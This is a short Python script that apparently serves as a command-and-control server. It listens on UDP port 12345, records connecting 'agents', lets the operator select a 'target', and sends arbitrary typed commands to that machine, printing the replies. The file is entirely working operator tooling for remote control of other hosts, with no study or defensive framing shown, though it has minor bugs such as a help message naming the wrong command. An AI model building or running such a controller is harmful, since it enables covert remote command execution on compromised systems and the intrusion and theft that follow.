#!/usr/bin/env python

import socket
import time
import threading

from prompt_toolkit import prompt
from prompt_toolkit.patch_stdout import patch_stdout
from prompt_toolkit import HTML, print_formatted_text as print

def main():
    bind_ip = '0.0.0.0'
    bind_port = 12345
    bufsize = 4096

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((bind_ip, bind_port))
    server_socket.settimeout(10)

    known_clients = {}
    active_client = None
    running = True

    def handle_incoming():
        while running:
            try:
                data, client_address = server_socket.recvfrom(bufsize)
            except TimeoutError:
                pass
            else:
                if len(data) == 0:
                   continue
                resp = data.decode().rstrip()
                addr_str = "%s:%d" % client_address
                if addr_str not in known_clients:
                    print(HTML("<ansigreen>New agent %s connected</ansigreen>" % addr_str))
                    known_clients[addr_str] = client_address
                if resp != "ready":
                    print("resp" + resp)


    t = threading.Thread(target=handle_incoming)
    t.daemon = True
    t.start()

    try:
        while running:
            with patch_stdout():
                if active_client is None:
                    cmd = prompt("> ")
                else:
                    cmd = prompt("(%s)> " %  active_client)

                tokenized = cmd.split(None)
                if tokenized[0] == "use":
                    if tokenized[1] in known_clients:
                        active_client = tokenized[1]
                        print("Set active target to %s" % tokenized[1])
                    else:
                        print(HTML("<ansired>Unknown target</ansired>"))
                else:
                    if active_client is None:
                        print(HTML("<ansired>Pick a target first: target target_address</ansired>"))
                        continue
                    if cmd is not None:
                        server_socket.sendto(cmd.encode(), known_clients[active_client])
    except KeyboardInterrupt:
        pass
    finally:
        running = False
        server_socket.close()

if __name__ == "__main__":
    main()
